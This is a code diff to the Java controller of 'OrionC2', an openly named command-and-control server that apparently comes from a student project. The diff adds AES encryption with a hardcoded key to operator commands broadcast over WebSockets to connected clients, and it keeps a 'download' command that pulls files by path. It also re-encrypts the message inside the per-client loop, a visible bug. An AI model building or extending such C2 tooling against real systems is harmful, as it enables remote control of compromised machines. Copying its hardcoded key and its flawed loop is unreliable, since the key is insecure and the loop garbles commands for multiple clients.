@@ -1,3 +1,27 @@
+// =============================================================================
+// Project Name: OrionC2
+// File: Main.java
+//
+// Copyright (c) 2026 Alban LEAUTIER
+//
+// Permission is hereby granted, free of charge, to any person obtaining a copy
+// of this software and associated documentation files (the "Software"), to deal
+// in the Software without restriction, including without limitation the rights
+// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+// copies of the Software, and to permit persons to whom the Software is
+// furnished to do so, subject to the following conditions:
+//
+// The above copyright notice and this permission notice shall be included in
+// all copies or substantial portions of the Software.
+//
+// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+// SOFTWARE.
+// =============================================================================
 package org.esisar.command_control;
 
 import io.javalin.Javalin;
@@ -17,11 +41,14 @@ import java.util.Scanner;
 
 public class Main {
 
-    ArrayList<Client> clients = new ArrayList<>();
-    String cheminFichier = "C:/Users/quent/Desktop/musique sheet/howlabr.pdf";
+    static ArrayList<Client> clients = new ArrayList<>();
+    static String cheminFichier = "C:/Users/quent/Desktop/musique sheet/howlabr.pdf";
 
-    public void main(String[] args) {
+    public static void main(String[] args) {
         // Javalin app = Javalin.create().start(7000);
+    	String cle = "azertyuiopqsdfgh";
+
+        AES aes = new AES(cle);
 
         Javalin app = Javalin.create(config -> {
             config.jetty.modifyWebSocketServletFactory(factory -> {
@@ -119,6 +146,7 @@ public class Main {
                     System.out.println("> Entrer Commande");
                     if(message.startsWith("download")){ cheminFichier = message.split(" ")[1];}
                     for (Client client : clients) {
+                    	message = aes.encrypt(message);
                         client.sendMessage(message);
                     }
                 }
@@ -133,7 +161,7 @@ public class Main {
 
 
 
-    private void sendFile(String cheminFichier, WsContext ctx) {
+    private static void sendFile(String cheminFichier, WsContext ctx) {
         try {
             byte[] donneesFichier = Files.readAllBytes(Path.of(cheminFichier));
             ByteBuffer buffer = ByteBuffer.wrap(donneesFichier);
